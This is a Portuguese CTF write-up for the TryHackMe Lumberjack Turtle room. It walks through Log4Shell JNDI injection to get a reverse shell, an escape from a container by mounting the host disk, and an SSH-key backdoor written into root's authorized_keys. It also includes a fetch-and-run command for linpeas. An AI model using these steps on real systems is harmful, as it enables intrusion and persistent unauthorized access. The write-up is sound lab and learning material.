# CTF-LUMBERJACK-THM
**Dificuldade - Média**

>Opa! parece que eu lembrei a senha do github... 🤥

<a href="https://tryhackme.com/room/lumberjackturtle"><img src="https://user-images.githubusercontent.com/32500664/161400606-1bf15aab-36be-4994-a601-e8c666be82c6.png"></a>

A maquina dá vez é a [Lumberjack Turtle](https://tryhackme.com/room/lumberjackturtle)

<h3>A maquina dá vez aborda os tópicos: CVE-2021-44228, Container Escape, Log4shell.<h3>

# 1 Enumeração:
  Pra começar a brincadeira primeiro a gente tem que descobrir com quem a gente ta brincando.
  ![1 Rodando nmap](https://user-images.githubusercontent.com/32500664/161874493-28914374-937f-4b7a-9716-d2698b6aa2b0.png)

# Pagina porta 80:
  ![2 Conteudo port80](https://user-images.githubusercontent.com/32500664/161875415-fd2367df-c044-4192-b7a6-8094404f1994.png) 
### Fuzzing na pagina 80.
  ![4 Resultado Fuff](https://user-images.githubusercontent.com/32500664/161875603-644316a9-bc69-401f-950b-2638fbdc222f.png)
  
### Pagina ~logs:
  ![5Pagina ~logs fuff](https://user-images.githubusercontent.com/32500664/161876245-742657dc-2f27-4069-b59c-78aed984566d.png)
  
### Como ele mesmo disse... Go deeper.
  ![7 Resultado fuff logs](https://user-images.githubusercontent.com/32500664/161876392-1b576890-0bbd-44c7-97ec-05fbb3aa6d04.png)

### /~logs/log4j
  ![8 Conteudo logs lo4j](https://user-images.githubusercontent.com/32500664/161878823-026187ed-469f-4a58-83e4-1f4306911a48.png)

# Explorando Log4shell:
  
### Bem didático qual a vulnerabilidade que temos que explorar.
  Vamos baixar a [ferramenta](https://github.com/welk1n/JNDI-Injection-Exploit) que vai gerar os Links JNDI que iremos injetar.
  ![9 Baixando exploit](https://user-images.githubusercontent.com/32500664/161882105-bbff5bf7-2985-4b02-a2d2-2335e1f706e8.png)

>Uma site gerador de payloads reverse shell bem simples de ser usado é o [reverse shell generator](https://www.revshells.com)
  
### Com o comando em mãos vamos usar a ferramenta para gerar os links JNDI
  ![9 1 Comando exploit](https://user-images.githubusercontent.com/32500664/161884764-6037c6f9-98df-4161-95b7-9db349b79797.png)

  ### Depois de executar o comando vamos pegar um link gerado e inserir na request.
  ![10 Usando exploit](https://user-images.githubusercontent.com/32500664/161885374-9e864f3b-7e72-407f-99bc-e9436cebc180.png)
  
  ### Adicionando um link ao corpo da requisição temos ação...
  
  ![10 1 Request com log4shell](https://user-images.githubusercontent.com/32500664/161885389-e8e8e04f-3226-4229-a3e7-82777c6a74af.png)

  ### ...e reação.
  
  ![11 recebendo shell](https://user-images.githubusercontent.com/32500664/162006254-d0cb090f-a2a5-4af3-bb1f-0d39ea7ddf3f.png)

  ### Cheguei chegando né ? 
  ![12 verificando user](https://user-images.githubusercontent.com/32500664/162014860-149567ca-7588-48cc-b18d-d9f8f7801eb8.png)
  
  ### Entramos aqui com um objetivo não ?
  ![13 Find na 1 flag](https://user-images.githubusercontent.com/32500664/162027118-017a73d1-d5e7-40f0-acc5-71ec1915ee20.png)
  
  ![14 pegando primeira flag](https://user-images.githubusercontent.com/32500664/162027152-1a6d4563-c6d4-4f2b-8582-34342b1a66bd.png)

# Tá faltando uma flag não tá ?
  ### Depois de um tempo procurando tive a ideia de usar o linpeas para ver se dá uma luz.
 > para baixar o script na maquina use o comando `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`  e em seguinda `bash. /linpeas.sh`

  ## Dando uma olhada no que o script me diz encontro uma seção afirmando que estou dentro de um container.
  ![16 descobrindo q é container](https://user-images.githubusercontent.com/32500664/162085746-a00cc933-1d63-4b2d-9177-55bb057e9d5a.png)
 
  ### E támbém é importante olhar a seção com permissões SUID
  >O SUID é definido para dar permissões temporárias para um usuário executar um programa ou arquivo com as permissões do proprietário do arquivo.
  
  # No caso temos permissão SUID ao executar o Mount
  ![18 mount SUID](https://user-images.githubusercontent.com/32500664/162086276-088cb595-82c0-4951-b76e-7e4228d21587.png)

### Estamos em um container com permissão SUID no Mount... tá na hora escapar desse container já né ?
  
  # Container Escape:
  
  # Dando uma estudadinha sobre Docker Escape no [hacktryckz](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounting-disk-poc1) aprendemos que podemos montar e ter acesso aos arquivos do sistema hospedeiro.
  
  ### Vamos procurar os discos.
  
  ![19 verificando discos](https://user-images.githubusercontent.com/32500664/162098227-4cd0ebf1-af4c-4d42-af8c-671d0d1a7fd7.png)

  ### Após criar uma pasta onde será criada o disco usando `mkdir /mnt/host` vamos montar o sistema do hospedeiro.
  
  ![21 montando host](https://user-images.githubusercontent.com/32500664/162098208-0bb75e0f-5662-4f3c-9556-13f0e241d760.png)

  ### Mesmo depois de tudo isso o criador da maquina dormiu com um palhaço antes...
  
  ![22 root flag bait](https://user-images.githubusercontent.com/32500664/162098189-e8863c1b-39dc-47cf-b831-efa0e99bb097.png)

  ### Como temos acesso aos arquivos do hospedeiro podemos criar um "backdoor" adicionando nossa chave publica do ssh no arquivo *authorized_keys* dentro do pasta `.ssh` dentro da pasta de usuário root
  
  > Para criar as chaves ssh use o comando `ssh-keygen`
  > Para inserir a chave dentro do arquivo vamos utilizar o comando `echo "${Chave} >>> /root/.ssh/authorized_keys`
  
  ![24 Colocando pub key no arquivo](https://user-images.githubusercontent.com/32500664/162098173-1428dd16-2055-4e1c-8190-4d8c0730bce8.png)

  ### Após ter feito isso vamos nos conectador a maquina hospedeira usando o ssh e nossa chave id_rsa
  
  ![25 conenctando na maquina](https://user-images.githubusercontent.com/32500664/162098114-00ac3d02-20ef-4a35-9649-1bffe295e8ab.png)
  
  ### Escape realizado e agora vamo procurar a tal flag.
  >Como não encontrei nada com o comando find vamos ao diretório do usuário root e usar o comando `ls -laR`.
  > o -l lista as permissões.
  > o -a lista todos arquivos inclusive os ocultos.
  > o -R lista diretórios e subdiretórios recursivamente.
  
  ![26 Procurando arquivo flag](https://user-images.githubusercontent.com/32500664/162098076-e5d38954-061e-4d42-a23b-eae5d28d6a80.png)
  
  ![27 resultado FIND NA FLAG ROOT](https://user-images.githubusercontent.com/32500664/162098079-c8598efc-42aa-4df9-aab1-672a0048ecc9.jpg)

  ### E voilà! Temos a ultima flag.
  
  ![28 cat flagroot](https://user-images.githubusercontent.com/32500664/162098026-0d64f49e-0823-4268-b8cf-0f54d82bf305.jpg)

  
  
  
  
  
